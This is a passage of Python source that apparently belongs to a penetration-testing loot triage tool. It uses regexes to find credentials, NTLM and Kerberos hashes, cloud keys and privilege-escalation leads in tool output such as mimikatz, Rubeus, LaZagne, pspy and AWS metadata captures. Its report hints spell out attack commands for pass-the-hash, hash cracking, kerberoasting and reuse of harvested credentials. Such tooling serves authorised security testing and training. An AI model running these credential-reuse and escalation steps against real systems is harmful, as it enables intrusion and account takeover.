    # Snaffler annotated (FileResult)[File] {Color}<rule|R|kB|mtime|path> format
    ("Snaffler annotated", re.compile(
        r'\((?:FileResult|RwStatusResult|ShareResult|DirResult)\)'
        r'\[(?:File|Share|Dir|RwStatus)\]\s+'
        r'\{(Black|Red|Yellow|Green)\}'
        r'<([A-Za-z][A-Za-z0-9]+)\|[^|]*\|[^|]*\|[^|]*\|'
        r'(\\\\[^>|]+|[A-Za-z]:\\[^>|]+|/[^>|]+)>'
        r'(?:\(([^\r\n]{0,400})\))?')),
    # Snaffler (ShareResult)[Share] simpler form
    ("Snaffler share", re.compile(
        r'\(ShareResult\)\[Share\]\s*\{(?:Red|Black|Yellow|Green)\}<[A-Z]\|'
        r'(\\\\[^\s>\\]+\\[^\s>]+)>')),
    # ---- iter-17: deep-corpus-mine gaps (workflow wkl2kkzn5) ----
    # sudo -l output line (distinct from /etc/sudoers - no user/host prefix):
    #     (root) NOPASSWD: /usr/bin/find
    # Triple-CRITICAL gap in the mine: missed every PEAS / linPEAS / sudo-l
    # cap in HTB Lame/Nibbles/THM Common-Linux-Privesc etc.
    # iter-166: two fixes to prior sudo -l pattern:
    #   1. leading whitespace optional (some sudo-l pastes are unindented).
    #   2. accept sudoedit as command (no leading /) since sudoedit doesn't
    #      require an absolute path in sudoers, and sudoedit /etc/shadow /
    #      sudoedit /root/... is an instant root read primitive.
    ("sudo -l NOPASSWD", re.compile(
        r'(?im)^\s*\(([^)\r\n]{1,80})\)\s+(?:NOPASSWD|SETENV)\s*:\s*'
        r'((?:/\S|sudoedit\b)[^\r\n]{0,200})')),
    # HTB Lame / smbclient / enum4linux Samba banner (CVE-2007-2447 range):
    #     Server=[Samba 3.0.20-Debian]
    ("Samba vuln banner", re.compile(
        r'(?i)Server\s*=\s*\[\s*Samba\s+(3\.0\.(?:[0-9]|1[0-9]|2[0-5])'
        r'(?:[.\-][\w.-]*)?)\s*\]')),
    # HTB Blocky-style Java/C#/JS typed field secret:
    #     public String sqlPass = "FakeBlockyPass2024!";
    ("Java field secret", re.compile(
        r'(?:public|private|protected|static|final|var|let|const|String|str)\s+'
        r'(?:public|private|protected|static|final|String|str|var|let|const|\s)*'
        r'([A-Za-z_]\w*(?:Pass|Password|Passwd|Pwd|Passphrase|Secret))\s*=\s*'
        r'["\']([^"\'\r\n]{3,})["\']', re.IGNORECASE)),
    # linPEAS bracketed-CVE line: `[+] [CVE-2021-4034] PwnKit`
    # Existing PEAS finding regex required unbracketed CVE token.
    ("PEAS bracketed CVE", re.compile(
        r'(?i)\[(?:[+!*])\]\s+\[?CVE-\d{4}-\d{2,7}\]?[^\r\n]{0,200}')),
    # Flask / itsdangerous session cookie (.eJw... zlib-prefix shape)
    ("Flask itsdangerous", re.compile(
        r'(?:^|[\s=;\'"])'
        r'(\.eJ[A-Za-z0-9_\-]{15,}\.[A-Za-z0-9_\-]{6,12}\.[A-Za-z0-9_\-]{20,})'
        r'(?=[\s;\'"]|$)')),
    # nmap NSE smb-vuln-* / ProFTPd CPFR/CPTO are multi-line - handled in
    # _multiline_passes() below (per-line _AD loop can't see across lines).
    # Steghide info / extract output (rijndael fingerprint is unique)
    ("Steghide artifact", re.compile(
        r'(?im)^\s*encrypted\s*:\s*rijndael-(?:128|192|256),\s*(?:cbc|ecb)\b')),
    # PHP wrapper LFI URL (php://filter/convert.base64-encode/resource=...)
    ("PHP wrapper LFI", re.compile(
        r'(?i)\b(?:php://(?:filter|input|expect)/[^\s\'"<>]{1,300}|'
        r'expect://[^\s\'"<>]{1,80}|phar://[^\s\'"<>]{1,200}|'
        r'data://text/plain(?:;base64)?,[^\s\'"<>]{1,300})')),
]


def _value_ok(value, line):
    cv = value.strip().strip("'\"")
    if len(cv) < 3 or len(cv) > 200:
        return False
    if filters.is_placeholder(value) or filters.is_known_example(value):
        return False
    if filters.is_code_not_literal(value, line):
        return False
    return True


# netexec / crackmapexec text-log service line:  PROTO  IP  PORT  HOSTNAME  [..]
# we learn host<->service so chains target the REAL ip (not <DC-IP>); the cred on
# the same line is still owned by credline below (we fall through, never claim).
_NXC_SVC = re.compile(r'^(SMB|WINRM|LDAPS?|MSSQL|SSH|FTP|RDP|WMI|NFS|VNC)\s+'
                      r'(\d{1,3}(?:\.\d{1,3}){3})\s+(\d{1,5})\s+(\S+)')
_NXC_PROTO = {"smb": "smb", "winrm": "winrm", "ldap": "ldap", "ldaps": "ldaps",
              "mssql": "mssql", "ssh": "ssh", "ftp": "ftp", "rdp": "rdp",
              "wmi": "smb", "nfs": "nfs", "vnc": "vnc"}


def _learn_nxc_service(line, path, store, seen):
    m = _NXC_SVC.match(line)
    if not m:
        return
    proto = m.group(1).lower()
    svc = _NXC_PROTO.get(proto, proto)
    ip, port, hostname = m.group(2), int(m.group(3)), m.group(4)
    key = (svc, ip)
    if key in seen:
        return
    seen.add(key)
    from analyzers.ingest.evidence import Evidence
    if hostname and hostname[0].isalnum():
        store.learn_host(ip=ip, names=[hostname])
    store.add(Evidence(kind="service", host=ip, port=port, service=svc, source=path))
    if svc in ("ldap", "ldaps"):     # LDAP exposed -> Domain Controller
        store.add(Evidence(kind="host", host=ip, fact="dc", source=path))


_SCCM_NAA_MULTI = re.compile(
    r'(?i)NetworkAccess(?:Account|Username)\s*[:=]\s*(\S+)[\s\S]{0,400}?'
    r'NetworkAccessPassword\s*[:=]\s*([^\r\n]{3,80})'
)

# Mimikatz sekurlsa::logonpasswords NTLM block. We bound the wildcard distance
# tightly to avoid catastrophic backtracking on big files; the real block has
# Username/Domain/NTLM within ~300 bytes of each other.
_MK_NTLM = re.compile(
    r'(?i)\*\s*Username\s*:\s*(\S{1,40})\s*\n[\s\S]{0,200}?'
    r'\*\s*Domain\s*:\s*(\S{1,40})\s*\n[\s\S]{0,200}?'
    r'\*\s*NTLM\s*:\s*([a-f0-9]{32})\b'
)
# Mimikatz wdigest cleartext password
_MK_WDIGEST = re.compile(
    r'(?i)wdigest\s*:[\s\S]{0,100}?'
    r'\*\s*Username\s*:\s*(\S{1,40})\s*\n[\s\S]{0,100}?'
    r'\*\s*Domain\s*:\s*(\S{1,40})\s*\n[\s\S]{0,100}?'
    r'\*\s*Password\s*:\s*(?!\(null\))([^\r\n]{3,80})'
)
# Mimikatz lsadump::sam block
_MK_SAM = re.compile(
    r'(?i)RID\s*:\s*[0-9a-f]+\s*\(\d+\)\s*\n[\s\S]{0,100}?'
    r'User\s*:\s*(\S{1,40})\s*\n[\s\S]{0,200}?'
    r'(?:Hash\s+)?NTLM(?:\s+hash)?\s*[:=]\s*([a-f0-9]{32})\b'
)
# Mimikatz dpapi::cred typed block
_MK_DPAPI_CRED = re.compile(
    r'(?i)\*\*\*\s*CREDENTIAL\s*\*\*\*[\s\S]{0,400}?'
    r'TargetName\s*:\s*([^\r\n]{1,80})[\s\S]{0,400}?'
    r'UserName\s*:\s*(\S{1,80})[\s\S]{0,400}?'
    r'CredentialBlob\s*:\s*([^\r\n]{3,200})'
)
# Rubeus kerberoast: SamAccountName + $krb5tgs$ block
_RUBEUS_KERB = re.compile(
    r'(?i)SamAccountName\s*:\s*(\S{1,40})[\s\S]{0,300}?'
    r'(\$krb5tgs\$\d+\$\*?\S{20,})'
)
# PowerView Get-DomainUser block: samaccountname + serviceprincipalname
_PV_KERB = re.compile(
    r'(?i)samaccountname\s*:\s*(\S{1,40})[\s\S]{0,400}?'
    r'serviceprincipalname\s*:\s*(\S{4,120})'
)
# cmdkey /list typed block
_CMDKEY_LIST = re.compile(
    r'(?i)Target\s*:\s*Domain:target=([^\r\n]{3,80})[\s\S]{0,200}?'
    r'User\s*:\s*([^\r\n]{1,80})'
)
# Lazagne typed credential block - title, URL, User, Password
_LAZAGNE = re.compile(
    r'(?im)^\s*(?:URL|Login|Username)\s*:\s*(\S{3,80})\s*\n[\s\S]{0,200}?'
    r'(?:Password|Pwd|Pass)\s*:\s*([^\r\n]{3,80})'
)
# pspy / pspy64 timestamped process line:
#   2024/03/14 12:34:56 CMD: UID=0    PID=4242  | /bin/bash /opt/backup.sh secret-token
# Real value: surfaces root-owned cron tasks + their argv (often plaintext token/path).
_PSPY_LINE = re.compile(
    r'(?m)^\d{4}/\d{2}/\d{2}\s+\d{2}:\d{2}:\d{2}\s+CMD:\s+UID=(\d+)\s+'
    r'PID=\d+\s*\|\s*(.{4,400})$'
)
# Docker registry config.json auths block (Docker for Linux/Windows, podman):
#   "auths": { "registry.example.com": { "auth": "<base64 user:pass>" } }
_DOCKER_AUTH = re.compile(
    r'"auths"\s*:\s*\{[\s\S]{0,2000}?'
    r'"([^"]{3,80})"\s*:\s*\{\s*"auth"\s*:\s*"([A-Za-z0-9+/=]{12,200})"',
    re.MULTILINE,
)
# AWS instance metadata service v1/v2 capture - IAM role JSON response
#   "AccessKeyId" : "ASIA...",  "SecretAccessKey" : "...", "Token" : "..."
# Real value: short-lived role creds harvested via SSRF; we surface all three.
_IMDS_BLOCK = re.compile(
    r'"AccessKeyId"\s*:\s*"(A(?:KIA|SIA)[A-Z0-9]{16,20})"[\s\S]{0,500}?'
    r'"SecretAccessKey"\s*:\s*"([A-Za-z0-9/+=]{30,60})"'
    r'(?:[\s\S]{0,500}?"Token"\s*:\s*"([A-Za-z0-9/+=]{40,})")?'
)
# PowerShell transcript header (Start-Transcript / auto-transcription on Win10+):
#   **********************
#   Windows PowerShell transcript start
#   Start time: 20240314120000
#   Username: DOMAIN\user
_PS_TRANSCRIPT = re.compile(
    r'\*{10,}\s*\n\s*Windows PowerShell transcript start\s*\n[\s\S]{0,400}?'
    r'Username\s*:\s*([^\r\n]{1,80})[\s\S]{0,400}?'
    r'(?:Machine|Configuration Name|Process ID)\s*:\s*([^\r\n]{1,80})'
)
# In a PS transcript / cleartext history, captured cmdline secrets (priv. creds):
#   ConvertTo-SecureString -String "ActualPlaintext" -AsPlainText -Force
_PS_CONVERT_SECRET = re.compile(
    r'(?i)ConvertTo-SecureString\s+(?:-String\s+)?["\']([^"\']{3,80})["\']\s+-AsPlainText'
)
# Burp Suite captured request: Authorization: Basic <base64>
_HTTP_AUTH_BASIC = re.compile(
    r'(?i)Authorization\s*:\s*Basic\s+([A-Za-z0-9+/]{8,}={0,2})'
)
# Captured Authorization: Bearer JWT (3 segments separated by '.')
_HTTP_AUTH_BEARER_JWT = re.compile(
    r'(?i)Authorization\s*:\s*Bearer\s+(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{6,})'
)
# Sherlock/Watson/wesng "Appears Vulnerable" missing-patch output block:
#   Title:       Win32k Elevation of Privilege
#   MSBulletin:  MS16-135
#   CVEID:       CVE-2016-7255
#   VulnStatus:  Appears Vulnerable
_WESNG_VULN = re.compile(
    r'(?im)Title\s*:\s*([^\r\n]{4,120})\s*\n[\s\S]{0,300}?'
    r'(?:MSBulletin|MSKB|BulletinKB|KB Article|KB)\s*:\s*([A-Za-z0-9\-_]{2,40})\s*\n[\s\S]{0,300}?'
    r'CVE(?:ID)?\s*:\s*(CVE-\d{4}-\d{4,7})[\s\S]{0,300}?'
    r'(?:VulnStatus|Status)\s*:\s*((?:Appears\s+Vulnerable|Vulnerable|likely|likely vulnerable)[^\r\n]*)'
)
# PrivescCheck / Sherlock JSON missing-patch:
#   {"VulnerabilityName": "MS16-135", "CVE": "CVE-2016-7255"}
_PE_JSON_VULN = re.compile(
    r'"(?:VulnerabilityName|Vulnerability)"\s*:\s*"([A-Za-z0-9\-_]{3,40})"'
    r'[\s\S]{0,200}?"CVE"\s*:\s*"(CVE-\d{4}-\d{4,7})"'
)


def _multiline_passes(path, report, store):
    """File-level passes that need multi-line context. iter-12: head read
    raised from 200 KB to 4 MB so secretsdump/SCCM logs/mimikatz dumps aren't
    silently truncated. Patterns use bounded `.{0,N}?` lazy spans so 4 MB is
    safe (no catastrophic backtracking on adversarial input - verified)."""
    # iter-12: read via filters.read_text() so UTF-16LE / UTF-8 BOM /
    # gz/bz2/xz are all handled by ONE code path. Also de-NULs by leaving
    # them in (downstream multi-line regexes don't anchor on NUL).
    text = filters.read_text(path, max_bytes=4 * 1024 * 1024)
    if not text:
        return
    from analyzers.ingest.evidence import Evidence
    from analyzers.patterns import HASHES

    # iter-24: PowerShell line continuation `\r?\n + leading whitespace
    # joins logical commands. A history file with
    #     Set-LocalUser -Name admin -Password (ConvertTo-SecureString `
    #         -String "P@ssw0rd!" -AsPlainText -Force)
    # is one logical command but the existing regex anchors per-line.
    # Normalise BEFORE the per-line matchers so `_PS_CONVERT_SECRET et al.
    # see the joined form. Only apply to PowerShell-ish files to keep
    # the rest of the per-line matchers intact (line numbers in PS files
    # may shift by one - acceptable since the captured secret is what
    # matters).
    low = path.lower()
    if (low.endswith((".ps1", ".psm1", ".ps1xml", ".psd1"))
            or "powershell" in low or "consolehost_history" in low):
        text = re.sub(r'`[ \t]*\r?\n[ \t]+', ' ', text)

    def _ln(m):
        return text[: m.start()].count("\n") + 1

    # iter-12 scope-bleed guard: reject a multi-line match where a *second*
    # occurrence of the record-anchor key sits between the captures, meaning
    # the lazy `.{0,N}?` walked across a sibling record.
    def _no_bleed(m, first_grp, last_grp, anchor_rx):
        span = text[m.start(first_grp):m.start(last_grp)]
        return not anchor_rx.search(span)

    # iter-12 scope-bleed anchor regexes (look for repeated record headers
    # inside a multi-line match - signals lazy span walked across siblings).
    _NAA_BLEED = re.compile(r'(?i)NetworkAccess(?:Account|Username)')
    _MK_USER_BLEED = re.compile(r'(?i)\*\s*Username\s*:')
    _MK_RID_BLEED = re.compile(r'(?i)\bRID\s*:\s*[0-9a-f]+\s*\(\d+\)')
    _MK_CRED_BLEED = re.compile(r'(?i)\*\*\*\s*CREDENTIAL\s*\*\*\*')
    _SAM_BLEED = re.compile(r'(?i)\bSamAccountName\s*:')
    _LAZAGNE_BLEED = re.compile(r'(?im)^\s*(?:URL|Login|Username)\s*:')

    # SCCM NAA
    for m in _SCCM_NAA_MULTI.finditer(text):
        if not _no_bleed(m, 1, 2, _NAA_BLEED):
            continue
        u, p = m.group(1).strip(), m.group(2).strip()
        if filters.is_placeholder(p):
            continue
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"SCCM NAA: {u}:{p}",
                   hint="Network Access Account - typically a domain account; reuse for SMB/WinRM")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=p, source=path, line=_ln(m)))

    # Mimikatz NTLM block (logonpasswords)
    for m in _MK_NTLM.finditer(text):
        if not _no_bleed(m, 1, 3, _MK_USER_BLEED):
            continue
        u, dom, nt = m.group(1), m.group(2), m.group(3)
        if filters.is_blank_hash(nt) or filters.is_canonical_sample(nt):
            continue
        report.add("HIGH", "PASSWORD HASHES", path, _ln(m),
                   f"NTLM (NT) {dom}\\{u}: {nt}",
                   hint=f"PtH: nxc smb <host> -d {dom} -u {u} -H {nt}  |  crack: hashcat -m 1000 <nt> rockyou.txt")
        HASHES.append(("1000", "NTLM", nt, path, _ln(m)))

    # Mimikatz wdigest cleartext
    for m in _MK_WDIGEST.finditer(text):
        if not _no_bleed(m, 1, 3, _MK_USER_BLEED):
            continue
        u, dom, pw = m.group(1), m.group(2), m.group(3).strip()
        if filters.is_placeholder(pw) or pw.lower() in ("(null)", "n/a"):
            continue
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"wdigest cleartext: {dom}\\{u}:{pw}",
                   hint=f"reuse: nxc smb <host> -d {dom} -u {u} -p '{pw}'")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=pw, domain=dom, source=path, line=_ln(m)))

    # Mimikatz lsadump::sam
    for m in _MK_SAM.finditer(text):
        if not _no_bleed(m, 1, 2, _MK_RID_BLEED):
            continue
        u, nt = m.group(1), m.group(2)
        if filters.is_blank_hash(nt) or filters.is_canonical_sample(nt):
            continue
        report.add("HIGH", "PASSWORD HASHES", path, _ln(m),
                   f"SAM NTLM {u}: {nt}",
                   hint=f"PtH local: nxc smb <host> -u {u} -H {nt} --local-auth")
        HASHES.append(("1000", "NTLM", nt, path, _ln(m)))

    # Mimikatz dpapi::cred typed
    for m in _MK_DPAPI_CRED.finditer(text):
        if not _no_bleed(m, 1, 3, _MK_CRED_BLEED):
            continue
        target, u, blob = m.group(1).strip(), m.group(2).strip(), m.group(3).strip()
        report.add("HIGH", "CRED PAIRS", path, _ln(m),
                   f"DPAPI cred for {target} ({u}): {blob[:50]}",
                   hint="if blob looks like plaintext, reuse; else SharpDPAPI / dpapi.py to decrypt")
        # iter-13: feed the Evidence store so downstream chain logic sees it.
        if store is not None:
            store.add(Evidence(kind="cred", user=u, plaintext=blob,
                               source=path, line=_ln(m)))

    # Rubeus kerberoast: user-bound hash binding
    for m in _RUBEUS_KERB.finditer(text):
        if not _no_bleed(m, 1, 2, _SAM_BLEED):
            continue
        u, h = m.group(1), m.group(2)
        report.add("HIGH", "PASSWORD HASHES", path, _ln(m),
                   f"Kerberoast TGS ({u}): {h[:60]}...",
                   hint=f"hashcat -m 13100 tgs.txt rockyou.txt - cracked plaintext = {u}'s svc-account password")
        HASHES.append(("13100", "Kerberoast TGS", h, path, _ln(m)))
        # iter-13: store the kerberoastable principal for chain enrichment
        if store is not None:
            store.add(Evidence(kind="kerberoastable", user=u,
                               source=path, line=_ln(m)))

    # PowerView Get-DomainUser kerberoastable
    # iter-167: apply _SAM_BLEED guard so a two-user Get-DomainUser dump
    # doesn't mismatch svc_web's samaccountname with svc_db's spn (very
    # common with piped `Get-DomainUser -SPN | fl *`). Existing _SAM_BLEED
    # anchor from iter-12 is defined above at line 1142.
    for m in _PV_KERB.finditer(text):
        if not _no_bleed(m, 1, 2, _SAM_BLEED):
            continue
        u, spn = m.group(1), m.group(2)
        report.add("HIGH", "RECON", path, _ln(m),
                   f"Kerberoastable: {u}  spn={spn[:50]}",
                   hint="impacket-GetUserSPNs <dom>/<user>:<pw> -dc-ip <dc> -request -outputfile tgs.txt; hashcat -m 13100")
        if store is not None:
            store.add(Evidence(kind="kerberoastable", user=u,
                               source=path, line=_ln(m)))

    # cmdkey /list saved
    for m in _CMDKEY_LIST.finditer(text):
        target, u = m.group(1).strip(), m.group(2).strip()
        report.add("HIGH", "INTERESTING FILES", path, _ln(m),
                   f"cmdkey saved cred for {target} (user: {u})",
                   hint=f"runas /savecred /user:\"{u}\" \"cmd.exe\"  - opens a shell as that user")
        if store is not None:
            store.add(Evidence(kind="user", user=u, host=target,
                               source=path, line=_ln(m)))

    # Lazagne extracted creds
    for m in _LAZAGNE.finditer(text):
        if not _no_bleed(m, 1, 2, _LAZAGNE_BLEED):
            continue
        u, p = m.group(1), m.group(2).strip()
        if (filters.is_placeholder(p) or filters.is_placeholder(u)
                or p.lower() in ("(null)", "[empty]", "(empty)")):
            continue
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"Lazagne extracted: {u}:{p}",
                   hint=f"reuse: nxc smb <host> -u <user> -p '{p}'  - browser/wifi/mail/DPAPI lift")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=p, source=path, line=_ln(m)))

    # pspy: surface ROOT (UID=0) cron/service argv only; non-root is noise.
    # Each path emits at most a few top findings (avoid blowing the dashboard).
    pspy_seen = set()
    pspy_n = 0
    for m in _PSPY_LINE.finditer(text):
        if pspy_n >= 12:
            break
        uid = m.group(1)
        cmd = m.group(2).strip()
        # only flag root + suppress kernel-thread / login churn
        if uid != "0":
            continue
        if not cmd or cmd in pspy_seen:
            continue
        # ignore trivially benign / noisy entries
        cmd_lc = cmd.lower()
        if cmd_lc.startswith(("[", "/usr/lib/systemd", "/lib/systemd",
                              "sshd:", "(sd-pam)", "sleep ", "/usr/bin/dbus")):
            continue
        # interesting: scripts under /opt /home /tmp /var, or anything with a
        # plausible secret on the cmdline (-p, --password, token=, key=)
        is_script = any(p in cmd for p in ("/opt/", "/home/", "/tmp/", "/var/",
                                            "/root/", "/etc/cron"))
        is_secret_arg = bool(re.search(r'(?i)(--password|-p\s+\S|token=|api[_-]?key=|secret=)', cmd))
        if not (is_script or is_secret_arg):
            continue
        pspy_seen.add(cmd)
        pspy_n += 1
        sev = "HIGH" if is_secret_arg else "MEDIUM"
        report.add(sev, "INTERESTING FILES", path, _ln(m),
                   f"pspy root cmd: {cmd[:160]}",
                   hint="root cron/service path - check perms; if writable / argv leaks creds, that IS the privesc")

    # Docker registry config.json auths - base64(user:pass) per registry
    import base64 as _b64
    for m in _DOCKER_AUTH.finditer(text):
        registry, b64 = m.group(1), m.group(2)
        if filters.is_placeholder(b64):
            continue
        try:
            raw = _b64.b64decode(b64, validate=True).decode("utf-8", errors="replace")
        except Exception:
            continue
        if ":" not in raw:
            continue
        u, _, p = raw.partition(":")
        u, p = u.strip(), p.strip()
        if not p or filters.is_placeholder(p) or len(p) < 3:
            continue
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"Docker registry {registry} : {u}:{p}",
                   hint=f"docker login {registry} -u {u} -p '{p}'  - registry push/pull; sometimes reused for SSH/SMB")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                               source=path, line=_ln(m)))

    # AWS IMDS capture: surface short-lived IAM role STS creds.
    # iter-12 FP audit: Terraform .tfstate and CDK output also embed
    # "AccessKeyId" / "SecretAccessKey" fields - they are LITERAL state, not
    # IMDS captures. Require an IMDS-shaped marker (`"Code":"Success"`,
    # `"Type":"AWS-HMAC"`, `latest/meta-data/iam`, `LastUpdated`) in the
    # surrounding text. Filename gate also skips tfstate-shaped paths.
    _IMDS_CONTEXT = re.compile(
        r'(?i)"Code"\s*:\s*"Success"|"Type"\s*:\s*"AWS-HMAC"|'
        r'latest/meta-data/iam|"LastUpdated"\s*:|169\.254\.169\.254')
    plow = path.lower()
    if (plow.endswith((".tfstate", ".tfstate.backup", ".tfplan", ".tfvars"))
            or "/cdk.out/" in plow):
        skip_imds = True
    else:
        skip_imds = False
    for m in _IMDS_BLOCK.finditer(text):
        if skip_imds:
            continue
        akid, sak, tok = m.group(1), m.group(2), m.group(3)
        if filters.is_placeholder(akid) or filters.is_canonical_sample(akid):
            continue
        # iter-12: require IMDS-shaped context within +/- 2KB so plain
        # terraform-style JSON without the IMDS-distinctive fields doesn't fire.
        ctx_start = max(0, m.start() - 2048)
        ctx_end = min(len(text), m.end() + 2048)
        if not _IMDS_CONTEXT.search(text[ctx_start:ctx_end]):
            continue
        # iter-16: was emitting literal '<sak>' / '<tok>' placeholders even
        # though we already captured the values. Use them directly.
        report.add("CRITICAL", "ASSIGNED SECRETS", path, _ln(m),
                   f"AWS STS creds (IMDS): AccessKeyId={akid}",
                   hint=(f"export AWS_ACCESS_KEY_ID={akid}; "
                         f"export AWS_SECRET_ACCESS_KEY={sak}; "
                         + (f"export AWS_SESSION_TOKEN={tok}; " if tok else "")
                         + "aws sts get-caller-identity"))
        report.add("CRITICAL", "ASSIGNED SECRETS", path, _ln(m),
                   f"AWS Secret Access Key (IMDS): {sak[:8]}{'*'*(len(sak)-8)}",
                   hint="paired with AccessKeyId above; short-lived if 'Token' present")
        if tok:
            report.add("CRITICAL", "ASSIGNED SECRETS", path, _ln(m),
                       f"AWS Session Token (IMDS): {tok[:20]}{'*'*16}",
                       hint="must export AWS_SESSION_TOKEN alongside the AccessKeyId/SecretAccessKey")

    # iter-29: Kubernetes Secret manifest (apiVersion:v1, kind:Secret) with
    # data.<key>: <b64> entries. Decode each b64 and if it looks like a
    # password (printable, 4-80 chars, not placeholder), emit as CRED PAIRS.
    # Gated to files whose first ~400 bytes have both 'apiVersion' and
    # 'kind: Secret' to skip generic YAML.
    # iter-31 FP fix: also suppress on doc/cheatsheet files - a docs page
    # showing an example Secret manifest with 'password-goes-here' or
    # 'my-app-secret' isn't a real cred.
    if ("kind: Secret" in text[:800]
            and ("apiVersion" in text[:200] or "apiVersion" in text[:800])
            and not filters.is_doc_file(path)):
        _K8S_DATA = re.compile(
            r'(?im)^\s{2,6}([A-Za-z][A-Za-z0-9_-]{1,60})\s*:\s*'
            r'"?([A-Za-z0-9+/=]{8,})"?\s*$')
        import base64 as _b64_k8s
        in_data = False
        for lineno_k, line_k in enumerate(text.split("\n"), 1):
            ls = line_k.rstrip()
            if re.match(r'^\s*(data|stringData)\s*:\s*$', ls):
                in_data = True
                continue
            if in_data and ls and not ls.startswith(" "):
                in_data = False
            if not in_data:
                continue
            mk = _K8S_DATA.match(line_k)
            if not mk:
                continue
            k, v = mk.group(1), mk.group(2)
            try:
                dec = _b64_k8s.b64decode(v, validate=True).decode(
                    "utf-8", "replace").rstrip("\r\n")
            except Exception:
                dec = ""
            if not dec or len(dec) > 200 or not dec.isprintable():
                continue
            if filters.is_placeholder(dec):
                continue
            # heuristic: only surface as CRED if key hints at password/token/secret
            klower = k.lower()
            is_credy = any(h in klower for h in ("pass", "pwd", "token", "secret",
                                                  "key", "cred", "user", "auth"))
            if is_credy:
                report.add("CRITICAL", "CRED PAIRS", path, lineno_k,
                           f"K8s Secret data.{k}: {dec}",
                           hint=(f"apiVersion v1 Secret decoded value; reuse "
                                 f"'{dec}' as cred against the workload"))
                from analyzers.ingest.evidence import Evidence
                store.add(Evidence(kind="plaintext", plaintext=dec, source=path,
                                   line=lineno_k)) if store is not None else None

    # iter-28: RabbitMQ definitions.json users[].password_hash. The name +
    # password_hash + hashing_algorithm triplet spans JSON lines so we run
    # this at file scope. Only fire in files that look like RabbitMQ
    # definitions (path contains 'definitions.json' or matches the
    # top-level 'rabbit_version' marker).
    _RMQ_PWHASH = re.compile(
        r'"name"\s*:\s*"([^"]{1,80})"\s*,\s*"password_hash"\s*:\s*'
        r'"([A-Za-z0-9+/=]{20,})"\s*,\s*"hashing_algorithm"\s*:\s*'
        r'"([^"]{1,40})"')
    plow_rmq = path.lower()
    if ("definitions.json" in plow_rmq or "rabbit" in plow_rmq
            or '"rabbit_version"' in text[:400]):
        for m in _RMQ_PWHASH.finditer(text):
            if filters.is_doc_file(path):
                continue
            u, ph, algo = m.group(1), m.group(2), m.group(3)
            report.add("HIGH", "PASSWORD HASHES", path, _ln(m),
                       f"RabbitMQ {u} password_hash ({algo}): {ph}",
                       hint=("hash = base64(salt(4B) || sha256(salt||utf8(pw))). "
                             "Offline: for pw in rockyou; check sha256(salt||pw) "
                             "== decoded[4:]"))

    # PowerShell transcript header - flag the file for deeper inspection
    for m in _PS_TRANSCRIPT.finditer(text):
        u, machine = m.group(1).strip(), m.group(2).strip()
        report.add("HIGH", "INTERESTING FILES", path, _ln(m),
                   f"PowerShell transcript: {u} on {machine}",
                   hint=("operator session log - search for ConvertTo-SecureString, "
                         "-Password, Get-Credential, plaintext invocations"))

    # PowerShell transcripts / history: ConvertTo-SecureString -String "pw"
    for m in _PS_CONVERT_SECRET.finditer(text):
        pw = m.group(1)
        if filters.is_placeholder(pw):
            continue
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"PowerShell plaintext secret: {pw}",
                   hint=f"captured from -AsPlainText invocation; try as user pw: nxc smb <host> -u <user> -p '{pw}'")
        if store is not None:
            store.add(Evidence(kind="plaintext", plaintext=pw, source=path, line=_ln(m)))

    # iter-24: Set-LocalUser / Set-ADAccountPassword / net user with literal
    # plaintext in PowerShell history. Common patterns:
    #   net user Administrator P@ssw0rd! /domain
    #   Set-LocalUser -Name svc -Password (ConvertTo-SecureString "P@ss" -AsPlainText)
    #   Set-ADAccountPassword -Identity svc -NewPassword (ConvertTo-SecureString "P@ss" -AsPlainText -Force) -Reset
    # The ConvertTo-SecureString form is already caught by _PS_CONVERT_SECRET
    # (after the line-continuation join above). Catch the bare 'net user' here.
    _NET_USER_PW = re.compile(
        r'(?im)^\s*net\s+user\s+(\S{1,50})\s+([^\s/][\S]{2,60})(?:\s+/(?:add|domain|active))?\s*$')
    for m in _NET_USER_PW.finditer(text):
        u, pw = m.group(1), m.group(2)
        if filters.is_placeholder(pw) or pw.startswith(("*", "/")):
            continue
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"net user plaintext: {u}:{pw}",
                   hint=f"from PowerShell/cmd history; try: nxc smb <host> -u '{u}' -p '{pw}'")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=pw,
                               source=path, line=_ln(m)))

    # Burp captured Authorization: Basic <base64>
    for m in _HTTP_AUTH_BASIC.finditer(text):
        b64 = m.group(1)
        if filters.is_placeholder(b64):
            continue
        try:
            raw = _b64.b64decode(b64 + "==", validate=False).decode("utf-8", errors="replace")
        except Exception:
            continue
        if ":" not in raw or len(raw) > 200:
            continue
        u, _, p = raw.partition(":")
        u, p = u.strip(), p.strip()
        if (not u or not p or filters.is_placeholder(p) or len(p) < 3
                or not raw.isprintable()):
            continue
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"HTTP Basic captured: {u}:{p}",
                   hint=f"reuse: nxc smb <host> -u {u} -p '{p}' ; also try app SSO / webmail / VPN")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=p, source=path, line=_ln(m)))

    # Burp captured Authorization: Bearer <JWT>
    jwt_seen = set()
    for m in _HTTP_AUTH_BEARER_JWT.finditer(text):
        tok = m.group(1)
        if tok in jwt_seen:
            continue
        jwt_seen.add(tok)
        report.add("HIGH", "ASSIGNED SECRETS", path, _ln(m),
                   f"HTTP Bearer JWT: {tok[:30]}...",
                   hint="decode at jwt.io (offline) - check alg=none, weak HS256 secret (hashcat -m 16500), expiry")

    # Sherlock / Watson / wesng / PrivescCheck missing-patch output
    # Skip markdown writeups / cheatsheets - they routinely show wesng sample
    # blocks as documentation, not real loot.
    if filters.is_doc_file(path):
        return
    vuln_seen = set()
    for m in _WESNG_VULN.finditer(text):
        title, kb, cve, status = (m.group(1).strip(), m.group(2).strip(),
